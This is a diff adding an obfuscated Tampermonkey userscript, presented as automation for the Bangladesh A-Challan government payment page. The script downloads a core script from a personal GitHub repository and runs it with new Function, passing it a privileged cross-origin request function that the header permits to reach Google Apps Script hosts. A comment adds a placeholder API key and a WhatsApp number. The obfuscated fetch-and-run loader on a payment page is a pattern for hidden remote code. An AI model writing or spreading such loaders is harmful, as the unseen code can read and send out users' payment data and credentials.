@@ -1,0 +1,24 @@
+// ==UserScript==
+// @name         A-Challan Loader-E
+// @namespace    http://tampermonkey.net/
+// @version      5.1
+// @description  A-Challan Automatio
+// @author       You
+// @match        https://www.achallan.gov.bd/acs/v2/general/challan-payment*
+// @grant        GM_xmlhttpRequest
+// @connect      githubusercontent.com
+// @connect      script.google.com
+// @connect      script.googleusercontent.com
+// @connect      www.achallan.gov.bd
+// @run-at       document-end
+// ==/UserScript==
+function _0x2a7d(_0x14fe2f,_0x4f7691){_0x14fe2f=_0x14fe2f-0x182;const _0x6049d8=_0x6049();let _0x2a7d57=_0x6049d8[_0x14fe2f];return _0x2a7d57;}function _0x6049(){const _0x322ac1=['1543878IZYoec','status','251796epEZLe','Failed\x20to\x20load\x20core\x20script.\x20Status:\x20','1LelNcI','1417137HRTaRL','1923740DLWHBh','10RrOVWi','4OTEWdK','https://raw.githubusercontent.com/love2050s/challan-config/refs/heads/main/main-core.js','GET','384566uDjrsg','GM_xmlhttpRequest','3854536NKVkxt','Network\x20error\x20while\x20loading\x20the\x20script.','Execution\x20error:','5796963UFOgDk'];_0x6049=function(){return _0x322ac1;};return _0x6049();}(function(_0x40dec6,_0x1d64e4){const _0x33bc6d=_0x2a7d,_0x34d520=_0x40dec6();while(!![]){try{const _0x41b8ed=-parseInt(_0x33bc6d(0x185))/0x1*(parseInt(_0x33bc6d(0x183))/0x2)+parseInt(_0x33bc6d(0x186))/0x3*(parseInt(_0x33bc6d(0x189))/0x4)+-parseInt(_0x33bc6d(0x187))/0x5+parseInt(_0x33bc6d(0x192))/0x6+-parseInt(_0x33bc6d(0x18c))/0x7+-parseInt(_0x33bc6d(0x18e))/0x8+-parseInt(_0x33bc6d(0x191))/0x9*(-parseInt(_0x33bc6d(0x188))/0xa);if(_0x41b8ed===_0x1d64e4)break;else _0x34d520['push'](_0x34d520['shift']());}catch(_0x53a70d){_0x34d520['push'](_0x34d520['shift']());}}}(_0x6049,0x4fafe),(function(){'use strict';const _0x1409fb=_0x2a7d;const _0x57b350=_0x1409fb(0x18a);console['log']('Loading\x20A-Challan\x20Core\x20Script...'),GM_xmlhttpRequest({'method':_0x1409fb(0x18b),'url':_0x57b350,'onload':function(_0x31f1aa){const _0x416159=_0x1409fb;if(_0x31f1aa[_0x416159(0x182)]===0xc8)try{const _0x314464=_0x31f1aa['responseText'],_0x31210c=new Function(_0x416159(0x18d),_0x314464);_0x31210c(GM_xmlhttpRequest),console['log']('Core\x20Script\x20Loaded\x20Successfully.');}catch(_0x188c97){console['error'](_0x416159(0x190),_0x188c97);}else console['error'](_0x416159(0x184)+_0x31f1aa[_0x416159(0x182)]);},'onerror':function(){const _0x2a334b=_0x1409fb;console['error'](_0x2a334b(0x18f));}});}()));
+/*
+apiKey : test
+
+Whatsapp number : 01712162650
+
+
+
+
+*/
